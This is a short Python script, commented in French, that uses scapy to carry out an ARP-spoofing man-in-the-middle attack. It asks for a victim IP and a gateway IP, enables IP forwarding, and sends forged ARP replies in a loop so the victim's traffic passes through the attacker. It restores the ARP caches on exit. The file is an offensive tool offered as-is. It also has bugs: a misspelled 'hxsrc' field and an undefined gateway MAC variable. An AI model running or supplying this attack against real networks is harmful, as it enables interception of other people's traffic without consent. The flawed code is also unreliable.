#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# Import des modules
from scapy.all import *
import sys
import os
import time

# Demande a l'utilisateur des infos sur la victime
try:
    interface = input("[*] Entre l'interface désiré: ")
    victimIP = input("[*] Entre l'IP de la victime: ")
    gateIP = input("[*] Entre l'IP routeur: ")
except KeyboardInterrupt:
    print ("\n[*] demande de fermeture de l'utilisateur")
    print ("[*] Quitter ...")
    sys.exit(1)
time.sleep(10)
print ("\n[*] Début transmition IP ...")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Obtention de l'adresse MAC
def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
    
# Re-ARP les cibles
def reARP():

    print ("\n[*] Restoration de la cible...")
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2,pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hxsrc = victimMAC), count = 7)
    send(ARP(op = 2,pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hxsrc = gateMAC), count = 7)
    print ("\n[*] Désactivation de la transmition IP...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print ("\n[*] Arret en cours...")
    sys.exit(1)

# Tronper la cible
def trick(gm, vm):
    send(ARP(op = 2,pdst = victimIP, psrc = gateIP, hwdst = vm))
    send(ARP(op = 2,pdst = gateIP, psrc = victimIP, hwdst = gm))

# Tout regrouper
def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print ("[!] Impossible de trouver la passerelle adresse MAC")
        print ("[!] Quitter...")
        sys.exit(1)
    print ("[*] Attaque des cibles...")
    while 1:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break
mitm()

